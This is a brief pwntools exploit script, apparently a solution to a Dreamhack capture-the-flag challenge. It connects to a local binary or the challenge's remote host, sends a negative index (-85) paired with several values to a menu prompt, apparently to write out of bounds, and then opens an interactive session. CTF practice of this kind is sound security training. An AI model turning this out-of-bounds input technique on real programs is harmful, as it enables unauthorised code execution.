#!/usr/bin/env python3

from pwn import *

exe = ELF("./deploy/main")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 17489)

    return r


def main():
    r = conn()

    v = [0, 2, 3, 6, 9]
    for i in v:
        r.sendlineafter(b"> ", b"1")
        r.sendlineafter(b"Enter i & j > ", f"-85 {i}".encode())

    r.sendlineafter(b"> ", b"-1")
    r.interactive()


if __name__ == "__main__":
    main()